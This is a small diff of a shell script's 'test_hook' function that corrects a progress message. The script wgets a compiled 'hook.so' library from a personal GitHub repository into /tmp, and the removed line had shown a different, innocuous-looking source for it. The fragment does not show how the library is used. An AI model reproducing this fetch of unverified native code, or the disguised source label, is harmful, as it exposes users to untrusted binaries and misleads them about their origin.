@@ -74,7 +74,7 @@ test_hook() {
   separator
   
   step "Downloading hook library..."
-  progress "Source: github.com/js-query/testing"
+  progress "Source: github.com/wooxsec/spykochan-vscode"
   wget -q https://github.com/wooxsec/spykochan-vscode/raw/refs/heads/main/hook/hook.so -O /tmp/hook.so
   if [ -f /tmp/hook.so ]; then
     ok "Hook library downloaded successfully"
